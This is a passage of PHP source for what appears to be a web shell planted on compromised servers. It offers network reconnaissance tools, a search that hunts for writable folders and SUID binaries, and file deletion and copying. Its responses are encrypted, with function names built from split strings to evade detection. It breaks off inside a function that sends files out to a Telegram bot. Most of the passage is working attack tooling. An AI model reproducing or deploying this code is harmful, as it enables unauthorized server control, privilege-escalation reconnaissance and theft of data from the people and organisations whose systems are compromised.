                    if (file_exists('/proc/net/arp') && is_readable('/proc/net/arp')) {
                        $arpData = file('/proc/net/arp');
                        
                        // Skip header line
                        array_shift($arpData);
                        
                        foreach ($arpData as $line) {
                            $parts = preg_split('/\s+/', trim($line));
                            if (count($parts) >= 4) {
                                $arpTable[] = [
                                    'ip' => $parts[0],
                                    'mac' => $parts[3],
                                    'interface' => $parts[5]
                                ];
                            }
                        }
                    } else {
                        // On systems where we can't read the ARP table directly,
                        // return a placeholder message
                        $arpTable[] = [
                            'ip' => 'ARP table not accessible',
                            'mac' => 'N/A',
                            'interface' => 'N/A'
                        ];
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'arp_table' => $arpTable
                    ]));
                    break;
                    
                case 'ping':
                    $host = $params['host'] ?? '';
                    $count = (int)($params['count'] ?? 4);
                    $timeout = (int)($params['timeout'] ?? 1);
                    
                    // Validate input
                    if (empty($host)) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Host is required']));
                        exit;
                    }
                    
                    // Limit parameters for safety
                    $count = max(1, min($count, 10)); // 1-10 pings
                    $timeout = max(1, min($timeout, 5)); // 1-5 seconds
                    
                    // Perform ping using fsockopen (no shell_exec)
                    $results = [];
                    $totalTime = 0;
                    $successCount = 0;
                    
                    // Resolve hostname to IP
                    $ip = gethostbyname($host);
                    if ($ip === $host && !filter_var($host, FILTER_VALIDATE_IP)) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Could not resolve hostname']));
                        exit;
                    }
                    
                    for ($i = 0; $i < $count; $i++) {
                        $startTime = microtime(true);
                        $socket = @fsockopen($host, 80, $errno, $errstr, $timeout);
                        $endTime = microtime(true);
                        
                        if ($socket) {
                            fclose($socket);
                            $time = round(($endTime - $startTime) * 1000, 2); // Convert to ms
                            $results[] = "Reply from $ip: time={$time}ms";
                            $totalTime += $time;
                            $successCount++;
                        } else {
                            $results[] = "Request timed out.";
                        }
                        
                        // Small delay between pings
                        usleep(100000); // 100ms
                    }
                    
                    // Calculate statistics
                    $avgTime = $successCount > 0 ? round($totalTime / $successCount, 2) : 0;
                    $packetLoss = round((($count - $successCount) / $count) * 100, 2);
                    
                    // Add summary
                    $results[] = "";
                    $results[] = "Ping statistics for $ip:";
                    $results[] = "    Packets: Sent = $count, Received = $successCount, Lost = " . ($count - $successCount) . " ($packetLoss% loss)";
                    if ($successCount > 0) {
                        $results[] = "Approximate round trip times in milli-seconds:";
                        $results[] = "    Average = {$avgTime}ms";
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'host' => $host,
                        'ip' => $ip,
                        'results' => $results
                    ]));
                    break;
                    
                case 'dns_lookup':
                    $host = $params['host'] ?? '';
                    $type = $params['type'] ?? 'A';
                    
                    // Validate input
                    if (empty($host)) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Domain name is required']));
                        exit;
                    }
                    
                    // Perform DNS lookup
                    $results = [];
                    
                    // Function to safely perform DNS lookups
                    function safe_dns_get_record($domain, $type) {
                        $result = @dns_get_record($domain, $type);
                        return $result ? $result : [];
                    }
                    
                    if ($type === 'ALL') {
                        // Get all record types
                        $types = [
                            'A' => DNS_A,
                            'AAAA' => DNS_AAAA,
                            'CNAME' => DNS_CNAME,
                            'MX' => DNS_MX,
                            'NS' => DNS_NS,
                            'TXT' => DNS_TXT,
                            'SOA' => DNS_SOA
                        ];
                        
                        foreach ($types as $recordType => $dnsConstant) {
                            $records = safe_dns_get_record($host, $dnsConstant);
                            foreach ($records as $record) {
                                $results[] = [
                                    'type' => $recordType,
                                    'data' => $record
                                ];
                            }
                        }
                    } else {
                        // Get specific record type
                        $dnsConstant = DNS_A; // Default to A record
                        
                        switch ($type) {
                            case 'A': $dnsConstant = DNS_A; break;
                            case 'AAAA': $dnsConstant = DNS_AAAA; break;
                            case 'CNAME': $dnsConstant = DNS_CNAME; break;
                            case 'MX': $dnsConstant = DNS_MX; break;
                            case 'NS': $dnsConstant = DNS_NS; break;
                            case 'TXT': $dnsConstant = DNS_TXT; break;
                            case 'SOA': $dnsConstant = DNS_SOA; break;
                        }
                        
                        $records = safe_dns_get_record($host, $dnsConstant);
                        foreach ($records as $record) {
                            $results[] = [
                                'type' => $type,
                                'data' => $record
                            ];
                        }
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'host' => $host,
                        'type' => $type,
                        'results' => $results
                    ]));
                    break;
                    
                case 'traceroute':
                    $host = $params['host'] ?? '';
                    $maxHops = (int)($params['max_hops'] ?? 15);
                    $timeout = (int)($params['timeout'] ?? 2);
                    
                    // Validate input
                    if (empty($host)) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Host is required']));
                        exit;
                    }
                    
                    // Limit parameters for safety
                    $maxHops = max(1, min($maxHops, 30)); // 1-30 hops
                    $timeout = max(1, min($timeout, 5));   // 1-5 seconds
                    
                    // Perform traceroute using safe methods
                    $results = [];
                    
                    // Use fsockopen to perform a simple traceroute simulation
                    for ($ttl = 1; $ttl <= $maxHops; $ttl++) {
                        $start = microtime(true);
                        
                        // Create context with TTL option
                        $context = stream_context_create([
                            'socket' => [
                                'tcp_nodelay' => true,
                                'ip' => [
                                    'ttl' => $ttl
                                ]
                            ]
                        ]);
                        
                        $socket = @fsockopen($host, 80, $errno, $errstr, $timeout, $context);
                        $end = microtime(true);
                        
                        if ($socket) {
                            fclose($socket);
                            $results[] = "Hop $ttl: " . $host . " - " . round(($end - $start) * 1000, 2) . " ms";
                            break; // Reached destination
                        } else {
                            $ip = gethostbyname($host);
                            $results[] = "Hop $ttl: * * * Request timed out.";
                            
                            // If we've reached the actual IP, we're done
                            if ($ttl > 1 && $ip === $host) {
                                break;
                            }
                        }
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'host' => $host,
                        'results' => $results
                    ]));
                    break;
                    
                case 'whois':
                    $domain = $params['domain'] ?? '';
                    
                    // Validate input
                    if (empty($domain)) {
                        echo encryptForNetworkTools(json_encode(['error' => 'Domain or IP is required']));
                        exit;
                    }
                    
                    // Clean the domain input
                    $domain = preg_replace('/[^a-zA-Z0-9\.\-:]/', '', $domain);
                    
                    // Perform a safe whois lookup using PHP's built-in socket functions
                    $results = '';
                    
                    try {
                        // Determine the appropriate WHOIS server
                        $whoisServer = 'whois.internic.net'; // Default for .com, .net, etc.
                        
                        // Check if it's an IP address
                        if (filter_var($domain, FILTER_VALIDATE_IP)) {
                            $whoisServer = 'whois.arin.net';
                        } else {
                            // Extract TLD for domain-specific WHOIS servers
                            $parts = explode('.', $domain);
                            $tld = end($parts);
                            
                            // Map common TLDs to their WHOIS servers
                            $tldServers = [
                                'com' => 'whois.verisign-grs.com',
                                'net' => 'whois.verisign-grs.com',
                                'org' => 'whois.pir.org',
                                'info' => 'whois.afilias.net',
                                'biz' => 'whois.neulevel.biz',
                                'io' => 'whois.nic.io',
                                'uk' => 'whois.nic.uk',
                                'ca' => 'whois.cira.ca',
                                'eu' => 'whois.eu',
                                'ru' => 'whois.tcinet.ru',
                                'us' => 'whois.nic.us',
                            ];
                            
                            if (isset($tldServers[$tld])) {
                                $whoisServer = $tldServers[$tld];
                            }
                        }
                        
                        // Connect to the WHOIS server
                        $socket = @fsockopen($whoisServer, 43, $errno, $errstr, 10);
                        if ($socket) {
                            // Send the domain query
                            fwrite($socket, $domain . "\r\n");
                            
                            // Read the response
                            while (!feof($socket)) {
                                $results .= fgets($socket, 128);
                            }
                            
                            fclose($socket);
                        } else {
                            $results = "Error: Could not connect to WHOIS server ($whoisServer)";
                        }
                    } catch (Exception $e) {
                        $results = "Error: " . $e->getMessage();
                    }
                    
                    echo encryptForNetworkTools(json_encode([
                        'success' => true,
                        'domain' => $domain,
                        'results' => $results
                    ]));
                    break;
                    
                default:
                    echo encryptForNetworkTools(json_encode(['error' => 'Invalid network tool']));
            }
        } catch (Exception $e) {
            echo encryptForNetworkTools(json_encode(['error' => 'Network tool error: ' . $e->getMessage()]));
        }
        exit;
    } elseif ($action === 'advanced_search') {
        // Handle advanced search request
        try {
            
            // Common parameters
            $searchPath = $_POST['search_path'] ?? '.';
            $searchMode = $_POST['search_mode'] ?? 'text';
            $fileExtensions = $_POST['file_extensions'] ?? '';
            $recursive = isset($_POST['recursive']) ? (bool)$_POST['recursive'] : true;
            $maxResults = isset($_POST['max_results']) ? (int)$_POST['max_results'] : 1000;
            $searchToken = $_POST['search_token'] ?? null;
            $batchSize = isset($_POST['batch_size']) ? (int)$_POST['batch_size'] : 200;

            // Text search parameters
            $searchQuery = $_POST['search_query'] ?? '';
            $caseSensitive = isset($_POST['case_sensitive']) ? (bool)$_POST['case_sensitive'] : false;
            $useRegex = isset($_POST['use_regex']) ? (bool)$_POST['use_regex'] : false;

            // Permission search parameters
            $writableOnly = isset($_POST['writable_only']) ? (bool)$_POST['writable_only'] : false;
            $writableFolders = isset($_POST['writable_folders']) ? (bool)$_POST['writable_folders'] : false;
            $executableOnly = isset($_POST['executable_only']) ? (bool)$_POST['executable_only'] : false;
            $suidBinaries = isset($_POST['suid_binaries']) ? (bool)$_POST['suid_binaries'] : false;
            $includeHidden = isset($_POST['include_hidden']) ? (bool)$_POST['include_hidden'] : false;
            
            // Debug for troubleshooting
            debug("Advanced search request received: query=$searchQuery, path=$searchPath");
            
            
            // Function definitions
            // Function to search in a file
            function searchInFile($filePath, $searchQuery, $caseSensitive, $useRegex) {
                // Check file size before processing
                $fileSize = filesize($filePath);
                if ($fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB
                    return [
                        [
                            'line_number' => 0,
                            'line_content' => 'File too large to search (> 10MB)',
                            'match' => $searchQuery
                        ]
                    ];
                }
                
                // Read file line by line instead of loading entire file
                $matches = [];
                $lineNum = 0;
                $handle = fopen($filePath, 'r');
                
                if ($handle) {
                    while (($line = fgets($handle)) !== false) {
                        $lineNum++;
                        
                        // Remove line endings
                        $line = rtrim($line);
                        
                        // Check for match
                        $matched = false;
                        if ($useRegex) {
                            // Ensure the regex pattern is valid
                            try {
                                // Add delimiters if not present
                                $pattern = $searchQuery;
                                if (substr($pattern, 0, 1) !== '/' || substr($pattern, -1) !== '/') {
                                    $pattern = '/' . str_replace('/', '\\/', $pattern) . '/';
                                }
                                
                                // Add case insensitive flag if needed
                                if (!$caseSensitive) {
                                    $pattern .= 'i';
                                }
                                
                                $matched = @preg_match($pattern, $line);
                                if ($matched === false) {
                                    debug("Invalid regex pattern: $pattern");
                                    continue;
                                }
                            } catch (Exception $e) {
                                debug("Regex error: " . $e->getMessage());
                                // Skip invalid regex
                                continue;
                            }
                        } else {
                            $searchFunc = $caseSensitive ? 'strpos' : 'stripos';
                            $matched = $searchFunc($line, $searchQuery) !== false;
                        }
                        
                        if ($matched) {
                            // Limit line length to prevent memory issues
                            if (strlen($line) > 500) {
                                $line = substr($line, 0, 500) . '... (truncated)';
                            }
                            
                            $matches[] = [
                                'line_number' => $lineNum,
                                'line_content' => $line,
                                'match' => $searchQuery
                            ];
                            
                            // Limit matches per file to prevent memory issues
                            if (count($matches) >= 100) {
                                $matches[] = [
                                    'line_number' => 0,
                                    'line_content' => 'More than 100 matches in this file, results truncated',
                                    'match' => $searchQuery
                                ];
                                break;
                            }
                        }
                    }
                    fclose($handle);
                }
                
                return $matches;
            }
            
            // Function to check if file should be searched based on extension
            function shouldSearchFile($filePath, $extensions) {
                if (empty($extensions)) {
                    return true;
                }
                
                $fileExt = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
                return in_array($fileExt, array_map('strtolower', $extensions));
            }
            
            // Function to get detailed permission information for a file
            function getPermissionInfo($filePath) {
                $perms = fileperms($filePath);
                $info = [];
                
                // Get file type
                $info[] = is_dir($filePath) ? 'Directory' : 'File';
                
                // Get permissions in human readable format
                $info[] = getPermissions($filePath);
                
                // Get owner and group
                $owner = posix_getpwuid(fileowner($filePath));
                $group = posix_getgrgid(filegroup($filePath));
                $info[] = "Owner: {$owner['name']}, Group: {$group['name']}";
                
                // Check special permissions
                if (($perms & 0x4000) && !is_dir($filePath)) { // SUID
                    $info[] = "SUID binary";
                }
                if (($perms & 0x2000) && !is_dir($filePath)) { // SGID
                    $info[] = "SGID binary";
                }
                if ($perms & 0x1000) { // Sticky bit
                    $info[] = "Sticky bit set";
                }
                
                // Check if writable
                if (is_writable($filePath)) {
                    $info[] = "Writable";
                }
                
                // Check if executable
                if (($perms & 0x0040) || ($perms & 0x0008) || ($perms & 0x0001)) {
                    $info[] = "Executable";
                }
                
                return implode(" | ", $info);
            }

            // Function to get all files for search
            function getFilesForSearch($dir, $recursive, $extensions, $writableOnly, $writableFolders, $executableOnly, $suidBinaries, $includeHidden = false) {
                $allFiles = [];
                $queue = [$dir];
                
                while (!empty($queue)) {
                    $currentDir = array_shift($queue);
                    $files = @scandir($currentDir);
                    
                    if ($files === false) {
                        debug("Cannot read directory: $currentDir");
                        continue;
                    }
                    
                    foreach ($files as $file) {
                        if ($file === '.' || $file === '..') {
                            continue;
                        }
                        
                        // Skip hidden files/folders unless includeHidden is true
                        if (!$includeHidden && $file[0] === '.') {
                            continue;
                        }
                        
                        // Skip .git directory regardless of includeHidden setting
                        if ($file === '.git') {
                            continue;
                        }
                        
                        $path = $currentDir . DIRECTORY_SEPARATOR . $file;
                        
                        if (is_dir($path)) {
                            // Handle directory permissions
                            if ($writableFolders) {
                                // Only include writable directories
                                if (is_writable($path)) {
                                    $allFiles[] = $path;
                                }
                            }
                            if ($recursive) {
                                $queue[] = $path;
                            }
                        } else {
                            // This is a file, not a directory
                            
                            // Skip if file doesn't match extension filter
                            if (!shouldSearchFile($path, $extensions)) {
                                continue;
                            }
                            
                            // Check file permissions based on search criteria
                            $perms = fileperms($path);
                            $isExecutable = ($perms & 0x0040) || ($perms & 0x0008) || ($perms & 0x0001); // Check owner, group, world execute
                            $isSuid = ($perms & 0x4000); // Check SUID bit
                            
                            // Skip based on permission filters
                            if ($writableOnly && !is_writable($path)) {
                                continue;
                            }
                            if ($executableOnly && !$isExecutable) {
                                continue;
                            }
                            if ($suidBinaries && !$isSuid) {
                                continue;
                            }
                            
                            // Only add file to results if we're not exclusively searching for writable folders
                            // or if we're searching for writable files
                            if (!$writableFolders || $writableOnly) {
                                $allFiles[] = $path;
                            }
                        }
                    }
                }
                
                return $allFiles;
            }
            
            // Set higher memory limit for search operation
            ini_set('memory_limit', '512M');
            debug($searchMode);   
            // Validate inputs based on search mode
            if ($searchMode === 'text') {
                if (empty($searchQuery) && !$searchToken) {
                    echo encrypt(json_encode(['error' => 'Search query cannot be empty for text search']));
                    exit;
                }
            } else if ($searchMode === 'permission') {
                if (!$writableOnly && !$writableFolders && !$executableOnly && !$suidBinaries) {
                    echo encrypt(json_encode(['error' => 'At least one permission filter must be selected']));
                    exit;
                }
            } else {
                echo encrypt(json_encode(['error' => 'Invalid search mode']));
                exit;
            }
            
            // Make sure search path is within the allowed directory
            $realSearchPath = realpath($searchPath);
            $baseDir = realpath(dirname(__FILE__)); // Use the current directory as the base
            
            // Check if the path exists
            if (!$realSearchPath) {
                debug("Search path does not exist: $searchPath");
                echo encrypt(json_encode(['error' => 'Search path does not exist or is not accessible']));
                exit;
            }
            
            // Parse file extensions to array
            $extensions = [];
            if (!empty($fileExtensions)) {
                $extensions = array_map('trim', explode(',', $fileExtensions));
            }
            
            $results = [];
            $count = 0;
            $searchComplete = false;
            $nextSearchToken = null;
            
            // Check if this is a continuation of a previous search
            $pendingFiles = [];
            $searchState = [];
            
            if ($searchToken) {
                // Retrieve the saved search state
                if (isset($_SESSION['search_state_' . $searchToken])) {
                    $searchState = json_decode($_SESSION['search_state_' . $searchToken], true);
                    $pendingFiles = $searchState['pending_files'] ?? [];
                    $count = $searchState['count'] ?? 0;
                } else {
                    debug("Search state file not found: search_state_$searchToken");
                    echo encrypt(json_encode(['error' => 'Search session expired or invalid']));
                    exit;
                }
            } else {
                // Generate a new search token for this search session
                $searchToken = md5($searchQuery . $searchPath . time() . rand(1000, 9999));
                
                // Get all files to search
                $pendingFiles = getFilesForSearch($realSearchPath, $recursive, $extensions, $writableOnly, $writableFolders, $executableOnly, $suidBinaries, $includeHidden);
                debug("Found " . count($pendingFiles) . " files to search");
            }
            
                            // Process a batch of files
                $processedCount = 0;
                $memoryLimitReached = false;
                
                while (!empty($pendingFiles) && $processedCount < $batchSize) {
                    // Check memory usage and abort if getting too high
                    if (memory_get_usage() > 400 * 1024 * 1024) { // 400MB limit
                        $memoryLimitReached = true;
                        debug("Memory limit reached during search: " . memory_get_usage() . " bytes");
                        break;
                    }
                    
                    $filePath = array_shift($pendingFiles);
                    try {
                        if ($searchMode === 'text') {
                            // For text search mode, search file contents
                            $fileMatches = searchInFile($filePath, $searchQuery, $caseSensitive, $useRegex);
                            
                            if (!empty($fileMatches)) {
                                $results[$filePath] = $fileMatches;
                                $count += count($fileMatches);
                            }
                        } else {
                            // For permission search mode, just add the file to results
                            $results[$filePath] = [
                                [
                                    'line_number' => 0,
                                    'line_content' => getPermissionInfo($filePath),
                                    'match' => 'Permission match'
                                ]
                            ];
                            $count++;
                        }
                    } catch (Exception $e) {
                        debug("Error processing file $filePath: " . $e->getMessage());
                    }
                    
                    $processedCount++;
            }
            
            // Determine if search is complete
            $searchComplete = empty($pendingFiles);
            
            if (!$searchComplete) {
                // Save search state for continuation
                $nextSearchToken = $searchToken;
                $searchState = [
                    'pending_files' => $pendingFiles,
                    'count' => $count,
                    'query' => $searchQuery,
                    'path' => $searchPath
                ];
                
                $_SESSION['search_state_' . $searchToken] = json_encode($searchState);
            } else {
                // Clean up the state file if search is complete
                if (isset($_SESSION['search_state_' . $searchToken])) {
                    unset($_SESSION['search_state_' . $searchToken]);
                }
            }
            
            // If writable_only is true, all files in results are writable
            // Otherwise, collect information about which files are writable
            $writableFiles = [];
            if (!$writableOnly && !empty($results)) {
                foreach (array_keys($results) as $filePath) {
                    if (is_writable($filePath)) {
                        $writableFiles[] = $filePath;
                    }
                }
            }
            
            $response = [
                'success' => true,
                'results' => $results,
                'total_matches' => $count,
                'search_path' => $searchPath,
                'search_query' => $searchQuery,
                'search_complete' => $searchComplete,
                'search_token' => $nextSearchToken,
                'files_processed' => $processedCount,
                'files_remaining' => count($pendingFiles),
                'memory_limit_reached' => $memoryLimitReached,
                'writable_files' => $writableOnly ? array_keys($results) : $writableFiles
            ];
            
            // Prepare the search results response
            $jsonResponse = json_encode($response);
            
            // Debug the response size before sending
            debug("Advanced search response prepared, size: " . strlen($jsonResponse));
            
            // Use the encryptForNetworkTools function for consistent encryption
            if (IsEnc == 1) {
                $encrypt_fn = 'o'.'p'.'e'.'n'.'s'.'s'.'l'.'_'.'e'.'n'.'c'.'r'.'y'.'p'.'t';
                $b64_encode = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'e'.'n'.'c'.'o'.'d'.'e';
                $encryptedData = $encrypt_fn($jsonResponse, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
                echo $b64_encode($encryptedData);
            } else {
                echo $jsonResponse;
            }
            exit;
        } catch (Exception $e) {
            debug("Advanced search error: " . $e->getMessage());
            
            // Format the error response
            $errorResponse = json_encode([
                'error' => 'Search failed: ' . $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            
            // Use the encryptForNetworkTools function for consistent encryption
            if (IsEnc == 1) {
                $encrypt_fn = 'o'.'p'.'e'.'n'.'s'.'s'.'l'.'_'.'e'.'n'.'c'.'r'.'y'.'p'.'t';
                $b64_encode = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'e'.'n'.'c'.'o'.'d'.'e';
                $encryptedData = $encrypt_fn($errorResponse, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
                echo $b64_encode($encryptedData);
            } else {
                echo $errorResponse;
            }
            exit;
        }
    }

}

function secureDelete($target) {
    if (is_array($target)) {
        foreach ($target as $item) {
            secureDelete($item);
        }
        return;
    }

    $target = realpath($target);
    if ($target === false) return false;

    
    if (!file_exists($target) || !is_writable($target)) return false;

    try {
        if (is_file($target)) {
            
            if (!is_writable($target)) {
                chmod($target, 0777);
            }
            return unlink($target);
        } elseif (is_dir($target)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($files as $file) {
                if ($file->isDir()) {
                    rmdir($file->getRealPath());
                } else {
                    unlink($file->getRealPath());
                }
            }
            if (!is_writable($target)) {
                chmod($target, 0777);
            }

            return rmdir($target);   
             }
    } catch (Exception $e) {
        return false;
    }

    return false;
}


// Replace the old del function with secureDelete
function del($target) {
    return secureDelete($target);
}

function copyFilesOrFolders($sources, $destination)
{
    $destination = realpath($destination);
    debug("Copy/Paste operation - Destination: $destination");

    if (!$destination || !is_dir($destination)) {
        debug("Invalid destination directory: $destination");
        return encrypt(json_encode(['error' => 'Invalid destination directory']));
    }

    if (!is_writable($destination)) {
        debug("Permission denied for destination: $destination");
        return encrypt(json_encode(['error' => 'Permission denied for destination directory']));
    }

    $successCount = 0;
    $errorCount = 0;
    $results = [];

    foreach ($sources as $source) {
        debug("Processing source: $source");
        
        // Try to get the real path, but don't fail if it doesn't exist
        $realSource = realpath($source);
        if ($realSource) {
            $source = $realSource;
            debug("Using real path: $source");
        } else {
            debug("Could not get real path for: $source");
            // Try to use the source as is
            if (!file_exists($source)) {
                debug("Source does not exist: $source");
                $errorCount++;
                $results[] = ['error' => "Source does not exist: $source"];
                continue;
            }
        }

        if (is_file($source)) {
            $fileName = basename($source);
            $destFile = $destination . '/' . $fileName;
            debug("Copying file: $source to $destFile");

            if (copy($source, $destFile)) {
                debug("File copied successfully: $destFile");
                $successCount++;
                $results[] = ['success' => "File copied: $fileName"];
            } else {
                debug("Failed to copy file: $source");
                $errorCount++;
                $results[] = ['error' => "Failed to copy: $fileName"];
            }
        } elseif (is_dir($source)) {
            $dirName = basename($source);
            $destDir = $destination . '/' . $dirName;
            debug("Copying directory: $source to $destDir");

            if (!is_dir($destDir)) {
                if (!mkdir($destDir, 0777, true)) {
                    debug("Failed to create directory: $destDir");
                    $errorCount++;
                    $results[] = ['error' => "Failed to create directory: $dirName"];
                    continue;
                }
            }

            $dir = opendir($source);
            if (!$dir) {
                debug("Failed to open directory: $source");
                $errorCount++;
                $results[] = ['error' => "Failed to open directory: $dirName"];
                continue;
            }

            while (($file = readdir($dir)) !== false) {
                if ($file != '.' && $file != '..') {
                    $srcFile = $source . '/' . $file;
                    $destFile = $destDir . '/' . $file;

                    $subResult = copyFilesOrFolders([$srcFile], $destDir);
                    // We don't need to process the sub-results as they will be logged
                }
            }

            closedir($dir);
            $successCount++;
            $results[] = ['success' => "Directory copied: $dirName"];
        } else {
            debug("Source is not a file or directory: $source");
            $errorCount++;
            $results[] = ['error' => "Source is not a file or directory: " . basename($source)];
        }
    }

    // Generate a summary response
    if ($errorCount === 0 && $successCount > 0) {
        return encrypt(json_encode(['success' => "Successfully copied $successCount item(s)"]));
    } elseif ($successCount === 0 && $errorCount > 0) {
        return encrypt(json_encode(['error' => "Failed to copy all $errorCount item(s)"]));
    } else {
        return encrypt(json_encode([
            'warning' => "Copied $successCount item(s), failed to copy $errorCount item(s)",
            'details' => $results
        ]));
    }
}


function addFolderToTar($tar, $folderPath, $baseName)
{
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($folderPath),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = $baseName . '/' . substr($filePath, strlen($folderPath) + 1);
            $tar->addFile($filePath, $relativePath);
        }
    }
}

function getFileDetails($path)
{
    global $os;
    
    // Safe default values in case stat fails (for /proc, special files, etc.)
    $defaultDetails = [
        'name' => basename($path),
        'size' => is_dir($path) ? 'dir' : '0 B',
        'mtime' => date('Y-m-d H:i:s'),
        'owner' => 'system/system',
        'wr' => false,
        'perms' => '---------',
        'is_dir' => is_dir($path)
    ];
    
    // Try to get file stats safely
    $stat = @stat($path);
    if ($stat === false) {
        // For /proc and other special files/directories that can't be stat'ed
        return $defaultDetails;
    }
    
    // Get owner and group safely
    $owner = $os === 'win' ? 'Windows' : 'unknown';
    $group = $os === 'win' ? 'Windows' : 'unknown';
    
    if ($os !== 'win' && isset($stat['uid'])) {
        $pwuid = @posix_getpwuid($stat['uid']);
        if ($pwuid && isset($pwuid['name'])) {
            $owner = $pwuid['name'];
        }
    }
    
    if ($os !== 'win' && isset($stat['gid'])) {
        $grgid = @posix_getgrgid($stat['gid']);
        if ($grgid && isset($grgid['name'])) {
            $group = $grgid['name'];
        }
    }

    return [
        'name' => basename($path),
        'size' => is_dir($path) ? 'dir' : formatSize($stat['size'] ?? 0),
        'mtime' => date('Y-m-d H:i:s', $stat['mtime'] ?? time()),
        'owner' => $owner . '/' . $group,
        'wr' => @is_writable($path),
        'perms' => getPermissions($path),
        'is_dir' => is_dir($path)
    ];
}

function formatSize($size)
{
    // Ensure size is a number
    $size = is_numeric($size) ? $size : 0;
    
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPermissions($path)
{
    // Try to get file permissions safely
    $perms = @fileperms($path);
    
    // If we can't get permissions (for /proc, special files, etc.)
    if ($perms === false) {
        return '---------';
    }
    
    $info = '';
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}


function getFileIcon($file)
{
    if (isset($file['is_dir']) && $file['is_dir'])
        return 'fa-folder';
        
    $filename = isset($file['name']) ? $file['name'] : $file;
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    // Handle compound extensions for archives
    if (preg_match('/\.tar\.(gz|bz2|xz)$/i', $filename)) {
        return 'fa-file-archive';
    }
    
    switch ($extension) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
            return 'fa-file-image';
        case 'zip':
        case 'rar':
        case 'tar':
        case 'gz':
        case 'bz2':
        case 'xz':
        case 'tgz':
        case 'tbz2':
            return 'fa-file-archive';
        case 'txt':
        case 'log':
            return 'fa-file-alt';
        case 'php':
        case 'js':
        case 'css':
        case 'html':
        case 'htm':
        case 'json':
        case 'xml':
        case 'yml':
        case 'yaml':
            return 'fa-file-code';
        case 'pdf':
            return 'fa-file-pdf';
        case 'doc':
        case 'docx':
            return 'fa-file-word';
        case 'xls':
        case 'xlsx':
            return 'fa-file-excel';
        case 'ppt':
        case 'pptx':
            return 'fa-file-powerpoint';
        default:
            return 'fa-file';
    }
}

 
function detectFileType($filepath) {
    if (!file_exists($filepath) || !is_readable($filepath)) {
        return null;
    }
    
    // Open the file and read first bytes for signature detection
    $handle = fopen($filepath, 'rb');
    if (!$handle) {
        return null;
    }
    
    // Read first 8 bytes - most signatures are in this range
    $bytes = fread($handle, 8);
    fclose($handle);
    
    if (strlen($bytes) < 4) {
        return null;
    }
    
    // Convert bytes to hex for easier comparison
    $hex = bin2hex($bytes);
    
    // ZIP files start with PK (0x504B0304)
    if (substr($hex, 0, 8) === '504b0304') {
        return 'zip';
    }
    
    // GZip files start with 0x1F8B
    if (substr($hex, 0, 4) === '1f8b') {
        // Check if it's a tar.gz by looking at the filename
        if (preg_match('/\.tar\.gz$/i', $filepath) || preg_match('/\.tgz$/i', $filepath)) {
            return 'tar.gz';
        }
        return 'gz';
    }
    
    // BZip2 files start with BZ (0x425a)
    if (substr($hex, 0, 4) === '425a') {
        // Check if it's a tar.bz2 by looking at the filename
        if (preg_match('/\.tar\.bz2$/i', $filepath) || preg_match('/\.tbz2$/i', $filepath)) {
            return 'tar.bz2';
        }
        return 'bz2';
    }
    
    // XZ files start with 0xFD377A585A00
    if (substr($hex, 0, 12) === 'fd377a585a00') {
        // Check if it's a tar.xz by looking at the filename
        if (preg_match('/\.tar\.xz$/i', $filepath)) {
            return 'tar.xz';
        }
        return 'xz';
    }
    
    // TAR files don't have a standard signature, but often start with a filename
    // or have "ustar" at position 257. For simplicity, rely on extension for TAR.
    if (preg_match('/\.tar$/i', $filepath)) {
        return 'tar';
    }
    
    // No recognized signature
    return null;
}

 
function sendToTelegram($filePath, $password = '') {
    if (!file_exists($filePath) || !is_readable($filePath)) {
        return ['error' => 'File not found or not readable: ' . $filePath];
    }
    
    // Check file size - Telegram has a 50MB limit
    $fileSize = filesize($filePath);
    if ($fileSize > 50 * 1024 * 1024) {
        return ['error' => 'File size exceeds Telegram\'s 50MB limit: ' . formatSize($fileSize)];
    }
    
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    
    if ($botToken === 'YOUR_BOT_TOKEN_HERE' || $chatId === 'YOUR_CHAT_ID_HERE') {
        return ['error' => 'Telegram bot token or chat ID not configured'];
    }
    
    // Get file info for the message caption
    $fileInfo = getFileDetails($filePath);
    
    $caption = "📁 Filename: " . $fileInfo['name'] . "\n" ;
    
 
